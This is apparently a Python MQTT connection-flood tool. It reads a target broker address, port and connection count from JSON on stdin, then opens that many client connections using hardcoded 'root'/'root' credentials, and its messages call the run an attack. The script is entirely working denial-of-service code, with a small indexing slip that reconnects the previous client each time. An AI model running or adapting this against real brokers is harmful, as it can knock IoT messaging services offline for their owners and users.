import paho.mqtt.client as mqtt
import time
from tqdm import tqdm
import subprocess
import sys
import json

def process_json_input(json_string):
    try:
        data = json.loads(json_string)
        return data
    except json.JSONDecodeError as e:
        print("Invalid JSON format:", e)
        sys.stdout.flush()
        return None
    
def main(_broker_address, _port, request, username=None, password=None):
    try:
        vett = []  # Tạo mảng để lưu trữ clients
        print('\nRequesting connections...\n')
        sys.stdout.flush()

        for i in tqdm(range(int(request))):
            # client = mqtt_client.Client(mqtt_client.CallbackAPIVersion.VERSION1, client_id)
            client = mqtt.Client(mqtt.CallbackAPIVersion.VERSION1,f'client{i}')  # Tạo mới client
            
            # Nếu username và password được cung cấp, thiết lập thông tin đăng nhập
            if username and password:
                client.username_pw_set(username, password)

            print(f"Request send client{i}")
            sys.stdout.flush()
            vett.append(client)  # Thêm client vào mảng
            vett[i-1].connect(_broker_address, _port, 10000)  # Yêu cầu kết nối tới broker

        print('\nRequests sent !\n')
        print('[ Attack terminated ]\n')
        sys.stdout.flush()

    except KeyboardInterrupt:
        subprocess.call('clear', shell=True)
        print('ERROR: unexpected attack stop')
        sys.stdout.flush()

if __name__ == "__main__":
    data1 = sys.stdin.readline()
    data = process_json_input(data1)
    main(data["ipserver"], int(data["port"]), int(data["request"]), 'root', 'root')
